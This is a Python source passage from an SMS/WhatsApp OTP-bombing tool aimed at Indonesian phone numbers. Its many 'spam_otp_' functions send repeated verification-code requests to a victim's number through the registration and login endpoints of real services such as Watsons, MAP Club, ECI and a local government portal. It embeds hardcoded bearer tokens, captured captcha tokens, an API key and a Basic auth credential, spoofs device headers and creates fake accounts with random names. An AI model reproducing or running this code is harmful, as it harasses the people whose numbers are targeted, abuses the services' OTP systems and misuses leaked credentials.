        match = re.search("'_token':\\s*'([^']+)'", resp.text)
        if match:
            csrf = match.group(1)
            url = 'https://toss.tubankab.go.id/register/otp/act'
            headers_post = {
                **headers,
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://toss.tubankab.go.id',
                'referer': 'https://toss.tubankab.go.id/register',
                'x-requested-with': 'XMLHttpRequest'
            }
            data = f'nohp={nomor_lokal}&_token={csrf}'
            resp2 = session.post(url, headers=headers_post, data=data, timeout=10)
            return resp2.status_code < 400
        else:
            return False
            
    except Exception as e:
        return False

def spam_otp_farmaklik(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra']
        nama_r = f'{random.choice(first)} {random.choice(last)}'
        email = f'{spam_otp_codex(10)}@gmail.com'
        password = 'Yanto1234'

        session = requests.Session()
        
        # Step 1: Register
        url_reg = 'https://farmaklik-pos-api-main-784468809835.asia-southeast1.run.app/auth/register'
        r1 = session.post(url_reg, 
            json={
                'phone': nomor_lokal,
                'name': nama_r,
                'email': email,
                'password': password,
                'password_confirmation': password
            },
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        custom_token = r1.json().get('token')
        if not custom_token:
            return False
            
        # Step 2: Sign in with custom token
        url_sign = 'https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=AIzaSyDip_k5QiYuEVeuvevdVsT3Z7wC4CKUqNo'
        r2 = requests.post(url_sign,
            json={'token': custom_token, 'returnSecureToken': True},
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        id_token = r2.json().get('idToken')
        if not id_token:
            return False
            
        # Step 3: Request OTP
        url_otp = 'https://farmaklik-pos-api-main-784468809835.asia-southeast1.run.app/auth/otp-request'
        r3 = session.post(url_otp,
            json={'phone': nomor_lokal},
            headers={
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {id_token}'
            },
            timeout=10
        )
        
        return r3.status_code < 400
        
    except Exception as e:
        return False


def spam_otp_nutriclub(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor

        session = requests.Session()

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-length': '0',
            'origin': 'https://www.nutriclub.co.id',
            'priority': 'u=1, i',
            'referer': 'https://www.nutriclub.co.id/membership/api/otp',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }

        params = {
            'phone': nomor,
            'old_phone': nomor
        }

        url = 'https://www.nutriclub.co.id/membership/otp/'

        resp = session.post(url, params=params, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('status') == 'success' or data.get('success') == True:
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False



def spam_otp_eci_signup(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()
        url = 'https://eci.id/api/signup'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://eci.id',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': f'https://eci.id/verification?step=1&phone={nomor_lokal}',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }
        payload = {
            'turnstileToken': '1.FlcZTt4urBFodA8TZgMg=m=DObW7j9Z=9ljSOZWqdw0rkO3-0CavmsR35HGXFDP5xbkhY=yut_hkEYPtKxwNKaM8z_jn5zdWU9C666R56-82_uktbsyleZJMpKUXJ5O_YyzWHthYrUWhIYKN7OG8nFSPxail9hc18AvjBCJD4vg1xb2YNd8fGuCQ9MKz2LKHCu9pveTr_RUFARHZnoJ80H81lpDvQksoWQw5nk3BQY3ow38HgtaQ5y0h=DOuDgWlqnivmrFHMWYnuy3fvSd3emtZYzEZq=q=rq3rbGFYx=85MSFYyyq1ZxWz-5EENA4Q-MmiJr0z3eObaAWz-kPf-m0InGCqN2BiXfOujiTTBKzH_s-3InGwlRMr_ZwmDB5IkLxj1hwasIm3oIqe919oT9mNdGEGMA-ubZI=tYkyRyYuXpdnqLMqBh8cJ_lGkh=1QSZzEP3k27Zks3NLIJ28R5Dzk-ThGzdre-iQZgu2mCgnMAFPqCWH-ejkNfdL-NxgDd-0bLjxSSB2AoG130UMtR30XLcYvHh4FX5tuZeeFtbUrxl3v85tdzRQpBdWaEZJ2-eQqp6ET6RfQwgxIgAhFPwQIBFYlb5EdEI8TgH78qQzg4d7kyCrPaYBhl-qoOBPDA4ysvsaE7ayn41eM5sWqNkqG3t8kvG8m34n9d5oU7ED0L3wT3URKzSK72SSqnYTt_X2CQ3S9KBvA2Cq8syraA.0heD=_uESO3xDmE3-HbXgA.e10116f3a7254d476591ce86f5c00f1c19d0df489842937533a3fdd475c30e5a',
            'identity': nomor_lokal,
            'with': 'whatsapp'
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_eci(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()
        url = 'https://eci.id/api/resend-otp'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://eci.id',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': f'https://eci.id/verification?step=1&phone={nomor_lokal}',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }
        payload = {
            'identity': nomor_lokal,
            'with': 'sms'
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False


def spam_otp_qoalaplus(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor_lokal = nomor
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        else:
            nomor_lokal = '62' + nomor

        session = requests.Session()
        url = 'https://api.qoalaplus.com/agent/v2/user/generate-otp'
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'x-captcha-token': '0cAFcWeA5Msfa315E_l3hhB_yhZWBucSRsWe0q3TeQ4NLqjnuP4GBurA-Z8oi0ayEn8f6Ehq_odxZQozwHqrrNO32apO7ssYbpOr2f04zXSKuvtDhWpkOE_8lNhgE_Ruo7s6UmHOyLZhevGULgBfpqwTJoojmlbJrvSZqjRHyYTpgvIzgWLuNeFp2ehmkcTCD1nfArs=aW27ses0tj8sbKaPUcpN1jZbOzUDMXFRLIAc46DOwwUbDgK4ff=G=Du98xvEMktu2uFPmzz4FbMCOeKM94RYsN6UvlpslTLu2F=zjDNJWygMCG375e54sNnoTKfroN7ERbEpcEj15fDusyb3EXDH8TinONhqEaj=b2f=kvJnfML37lFfnka=0YU0Z4zyCr7WZYmE67kzE6d=UUdS9_1PJW1ZEU09dLKDqvxoPFoiwh7OZGEAMwC9HtT16wvgAD6c1He4=YIjXhrOf2gXFLjSjMixQr6fJJ5Tubrq4gmWL9C1QHcFCxfBTvKu8=HAJRDtztwjHHd6hvLStf=4EDewqXmyFWq9BXUotTqf8xrFql887UvmnJtw6E0v2OZf2P8wPY7fqmLbkALwyksrS8tXfmq6nTFS4oCqbmBZss82Dnj7K0YCHSnlSw=gei2mGU-TIQ2uZ510jWwyDZBKQEZ936zMr=WAvz4q3oP9GqUrA4OMogY0xrPQkcGN00EEP3NTqPXi9l2LcyK8l3uo43RHYmjrLjTGPWBOHKuZzLKhQnsTGYC1xgbuKz3EOG34Tg5rvCcvAAjrSuERsMR7PEy44jBXeGGQSjCEmToX6AwT6_OKpiYHcgRrBAUR03tcS7CD260ub5AbdrIfq8koUKZ=W0T4AbMsbTNks1bztI9tqo3dbRntAEMq=UZKe0SlymOqDOWOLcxG1JPJ24lka9DxmPvfjxDCQqsYWXhFbaIBHgot7w0Uxv9=BjoPzNieL4fJWpOzONbuiXCJ3Lzj8CBhjq-2F=msvW_D=ECoEh0WQjodXSeHxihipJZDP-_akE0WNz=D2=sDCGE8hv=T-2Yyt1_m7aWKtZtPunsq8KT8MKWdzmsMNFnH-56kKrxrQr7upZEgNSMBhm8I6s0ZDExkZ7HwSKKp8PfjGDRhw1si8GceaXReBt0-z-oyWfcoEqx5WiP9SKLaXd1A4kiZ4f8pXSKsM4rkSjpXJr6PAjzMRPBXGeyzwIfsSBA2Fnu_2Ltq64FEKq76IOI9o_mKaJCEMdGLBBDwgAOTKReju6J=8Gb3kC9FNsp9TRuHTUZyGKJWK_-3sMdKnuLJtTofD6aD5LCiNahFCsaWMZOGhqPXx_ohhCI5FME45mKDNZC8wa2lbbZN3TrufssyZb1diZBD7AfmZwSgvlO0hpl5jEqJh2ZpmKzS-zE6qbe3SQzhUZ9hc36A97ob0LER3UqYPlkjr6X=ZQM1btQSi5D6ZRYrwMK6D4nHZ2LURllhT2yWvu-DNhP_0U=TboFfp0ll0DP0p-5TK=b0fLWpi9gJFde-q7GCW83=MWjo5vAcMirjjtccQIW88BqmfbyPJomugOJlB4ZAitA74zK_ByU6H7vTJ0QfUWcU2eUms3n1jxTd8O6tSYbWWLK_=0hQ3xp_-UBUf39eGU=8mGFu=LLzKB3aUY40M6Np7H=vc05vs7Z2CPLCl5eM9xEg5YPbb_B3ykUAFlrB_9Panf6OeRpf5mBD-DbffwO1SYz46jtjSabA6QPgTN1k0YCYR2nMH8RN4rylj9dlrCEgR=LGLRqrM3GOl7QRZoZcl0NbFAAW0dwFlXfw6dPpX6uYidl0lUPJoTNPpwUNwRSRSN_vDg3_C7r2Wym1GNz8fPOQ2W6sJLYzJ4Eo_sctZT-Gjla=RkY_=Ho1A4ywvjhLz-4qEYK0zOpF-xcNEfYxiCIibPFaKK_Z9sZoozdUHiFTCCYIKbqqa7HuwEops9xmMPn6ijdroeDj2dhpQCsZnJwBfx91YZUwOmWMbR2X4slI1KQ9u7tShEs8cxmwrkyDDJchk7c8O9kHz9-MXPt00AEBEfC8a_qemRqoGZgwT5=2NUTAC6g15cqPeahdqKps1Qex_-iAFCaFwNRIU7JkaX9KjjLndKktdmbwwjOFfZlzsL_CxQRkuAAEJASI6jk9a-XhnJTpF7yD8-LhQUP83INxx0D0du=R-dG9QWaRp2IKdo0N1KRYf9Yn2vGNkd=MIJmfTDZARyiqFR7NRpWs=j-BB-WS9Q-o5kry76vLx2z6Tp9M8avujOetw6SCFbxjEJMRcvebxhudJfjnLxYYpX=2pWujuLEDaT3INF4lgEYUBMzaqxIm1iQ3k5hK_wHA',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://www.qoalaplus.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.qoalaplus.com/',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }
        payload = {
            'channel': 'WA',
            'usecase': 'REGISTRATION',
            'data': f'+{nomor_lokal}'
        }
        
        resp = session.patch(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False
        
def spam_otp_singa_yoi(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        else:
            if nomor.startswith('+62'):
                nomor = nomor[1:]
            else:
                if not nomor.startswith('62'):
                    nomor = '62' + nomor
        session = requests.Session()
        headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=143&model=SM-S928B&systemVersion=14&platform=android&appsflyer_id=', json={'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '\"msg\":\"', '\"') == 'Success'
    except:
        return False

        
def spam_otp_uangme(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor
        
        import time
        import random
        import uuid
        
        gaid = f"gaid_{str(uuid.uuid4())}"
        android_id = ''.join(random.choices('0123456789abcdef', k=16))
        
        url = 'https://api.uangme.com/api/v2/sms_code'
        
        params = {
            'phone': nomor,
            'scene_type': 'login',
            'send_type': 'wp'
        }
        
        headers = {
            'country': '510',
            'os': '1',
            'app_version': '400100',
            'ns': 'wifi',
            'gaid': gaid,
            'tz': 'Asia%2FMakassar',
            'fcm_reg_id': 'dgLeExmFSt-W-8YDYJSaxB:APA91bERax3q5c6JU2oiumkLMK8N1yLD3GA2xkdtZ9wsrFyNLT4iZmh1eDuxNABJJk55MU7N_2FJozqEdavrNqnZtPYBuEaytJspxcRgXuFXY4IBneS1k1A',
            'version': '34',
            'dfp': '0928585853654C1917E73C692285580D',
            'carrier': '11',
            'v': '1',
            'lan': 'in_ID',
            'model': 'Infinix%20X6532C',
            'android_id': android_id,
            'brand': 'Infinix',
            'aid': gaid,
            'timestamp': str(int(time.time())),
            'Host': 'api.uangme.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/3.12.1'
        }
        
        resp = requests.get(url, params=params, headers=headers, timeout=10)
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                return data.get('code') == 0 or data.get('success') == True
            except:
                return 'success' in resp.text.lower()
        return False
        
    except Exception as e:
        return False


def telp_spam_jogjakita(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:] 
        session = requests.Session()
        auth_resp = session.post('https://aci-user.bmsecure.id/oauth/token', data={'grant_type': 'client_credentials', 'uuid': '00000000-0000-0000-0000-000000000000', 'id_user': '0', 'id_kota': '0', 'location': '0.0,0.0', 'via': 'jogjakita_user', 'version_code': '501', 'version_name': '6.10.1'}, headers={'authorization': 'Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'okhttp/4.10.0'}, timeout=10)
        token = auth_resp.json().get('access_token')
        if not token:
            return False
        resp = session.post('https://aci-user.bmsecure.id/v2/user/signin-otp/voice/send', json={'phone_user': nomor, 'primary_credential': {'device_id': '', 'fcm_token': '', 'id_kota': 0, 'id_user': 0, 'location': '0.0,0.0', 'uuid': '', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}, 'uuid': '00000000-4c22-250d-3006-9a465f072739', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}, headers={'Content-Type': 'application/json; charset=UTF-8', 'Authorization': f'Bearer {token}'}, timeout=10)
        return resp.json().get('rc') == 200
    except:
        return False


def spam_otp_fastwork(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
        
        headers = {
            "Content-Type": "application/json",
            "Origin": "https://fastwork.id",
            "Referer": "https://fastwork.id/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
        }
        
        payload = {
            "phone_number": phone,
            "country_code": "62",
            "type": "whatsapp"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_sms_optikmelawai(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor

        url = "https://api.optikmelawai.com/api/v2/auth/register/verify/phone/request"
        headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://www.optikmelawai.com",
            "Referer": "https://www.optikmelawai.com/",
            "Accept": "application/json",
            "Language": "id"
        }
        payload = {
            "value": nomor,
            "provider": "mobile_number"
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_mapclub_wa(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        
        token = 'eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJhZmFkMTJlMS04ODk0LTQyOTMtOThkMy1iYmM5M2Y4N2ExZDAiLCJleHBpcmVkIjoxNzgyOTc2NDIxNzE1LCJleHBpcmUiOjM2MDAsImV4cCI6MTc4Mjk3NjQyMSwiaWF0IjoxNzgyOTcyODIxLCJwbGF0Zm9ybSI6IldFQiJ9.1-V0QBbQsXsOxrg7gwaoKzsN-WJIrzb4Qao64pxz50thAZ1m6byXeSbmRjerAkMdMzgdVH7NSknlwfyAXFbB9g'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'in-ID',
            'authorization': f'Bearer {token}',
            'client-platform': 'WEB',
            'client-timestamp': str(int(time.time() * 1000)),
            'content-type': 'application/json',
            'origin': 'https://www.mapclub.com',
            'referer': 'https://www.mapclub.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "account": nomor,
            "prefix": "62"
        }
        
        url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp'
        params = {'channel': 'WHATSAPP'}
        
        response = requests.post(url, headers=headers, json=payload, params=params, timeout=15)
        return response.status_code == 200
        
    except Exception as e:
        return False
        
def spam_otp_watsons(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        
        session = requests.Session()
        
        headers = {
            'Host': 'api.watsons.co.id',
            'Connection': 'keep-alive',
            'cache-control': 'no-cache, no-store, must-revalidate, post-check=0, pre-check=0',
            'sec-ch-ua-platform': '"Android"',
            'authorization': 'bearer 0Sv-5cyRFTYMcXj-qh92vqC1WQ4',
            'pragma': 'no-cache',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile': '?1',
            'expires': '0',
            'queue-target': 'https://www.watsons.co.id/id/register',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'vary': '*',
            'origin': 'https://www.watsons.co.id',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.watsons.co.id/',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }
        
        otp_payload = {
            "uid": "",
            "action": "GENERAL",
            "countryCode": "62",
            "target": nomor,
            "type": "WHATSAPP"
        }
        
        otp_url = 'https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR'
        
        resp_otp = session.post(otp_url, json=otp_payload, headers=headers, timeout=15)
        
        if resp_otp.status_code == 200:
            try:
                data = resp_otp.json()
                if data.get('status') == 'success' or data.get('success') == True:
                    return True
                elif data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                else:
                    return False
            except:
                return True
        else:
            return False
        
    except Exception as e:
        return False
        
def spam_otp_watsons_kedua(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        
        session = requests.Session()
        
        headers = {
            'Host': 'api.watsons.co.id',
            'Connection': 'keep-alive',
            'cache-control': 'no-cache, no-store, must-revalidate, post-check=0, pre-check=0',
            'sec-ch-ua-platform': '"Android"',
            'authorization': 'bearer 0Sv-5cyRFTYMcXj-qh92vqC1WQ4',
            'pragma': 'no-cache',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile': '?1',
            'expires': '0',
            'queue-target': 'https://www.watsons.co.id/id/register',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'vary': '*',
            'origin': 'https://www.watsons.co.id',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.watsons.co.id/',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }
        
        otp_payload = {
            "uid": "",
            "action": "REGISTRATION",
            "countryCode": "62",
            "target": nomor,
            "type": "SMS"
        }
        
        otp_url = 'https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR'
        
        resp_otp = session.post(otp_url, json=otp_payload, headers=headers, timeout=15)
        
        if resp_otp.status_code == 200:
            try:
                data = resp_otp.json()
                if data.get('status') == 'success' or data.get('success') == True:
                    return True
                elif data.get('message') and ('otp' in str(data.get('message')).lower() or 'sms' in str(data.get('message')).lower()):
                    return True
                else:
                    return False
            except:
                return True
        else:
            return False
        
    except Exception as e:
        return False
        
def spam_otp_mapclub_wa_kedua(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor
        
        token = "eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwMWQ3MmY3Yi1mMTY2LTRmM2YtOWZhYi1hMGViNGQ2MjE5YTIiLCJleHBpcmVkIjoxNzgzNTM3MTA4MDMzLCJleHBpcmUiOjM2MDAsImV4cCI6MTc4MzUzNzEwOCwiaWF0IjoxNzgzNTMzNTA4LCJwbGF0Zm9ybSI6IldFQiJ9.AEe4pFBbLiTtQkCBoc4NgFiyzxJmqVs-YjNp0HkW6Xbi14oOo_lRZGOojeF9nngJm6CwmvvGPtTZ34jZxyqzCg"
        
        url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'in-ID',
            'authorization': f'Bearer {token}',
            'client-platform': 'WEB',
            'client-timestamp': str(int(time.time() * 1000)),
            'content-type': 'application/json',
            'origin': 'https://www.mapclub.com',
            'referer': 'https://www.mapclub.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "account": nomor,
            "prefix": "62"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
        
    except Exception as e:
        return False

def spam_otp_mapclub_sms(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        
        token = 'eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJhZmFkMTJlMS04ODk0LTQyOTMtOThkMy1iYmM5M2Y4N2ExZDAiLCJleHBpcmVkIjoxNzgyOTc2NDIxNzE1LCJleHBpcmUiOjM2MDAsImV4cCI6MTc4Mjk3NjQyMSwiaWF0IjoxNzgyOTcyODIxLCJwbGF0Zm9ybSI6IldFQiJ9.1-V0QBbQsXsOxrg7gwaoKzsN-WJIrzb4Qao64pxz50thAZ1m6byXeSbmRjerAkMdMzgdVH7NSknlwfyAXFbB9g'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'in-ID',
            'authorization': f'Bearer {token}',
            'client-platform': 'WEB',
            'client-timestamp': str(int(time.time() * 1000)),
            'content-type': 'application/json',
            'origin': 'https://www.mapclub.com',
            'referer': 'https://www.mapclub.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            "account": nomor,
            "prefix": "62"
        }
        
        url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp'
        params = {'channel': 'SMS'}
        
        response = requests.post(url, headers=headers, json=payload, params=params, timeout=15)
        return response.status_code == 200
        
    except Exception as e:
        return False
        
def spam_otp_mapclub_sms_kedua(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor
        
        token = "eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwMWQ3MmY3Yi1mMTY2LTRmM2YtOWZhYi1hMGViNGQ2MjE5YTIiLCJleHBpcmVkIjoxNzgzNTM3MTA4MDMzLCJleHBpcmUiOjM2MDAsImV4cCI6MTc4MzUzNzEwOCwiaWF0IjoxNzgzNTMzNTA4LCJwbGF0Zm9ybSI6IldFQiJ9.AEe4pFBbLiTtQkCBoc4NgFiyzxJmqVs-YjNp0HkW6Xbi14oOo_lRZGOojeF9nngJm6CwmvvGPtTZ34jZxyqzCg"
        
        url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=SMS'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'in-ID',
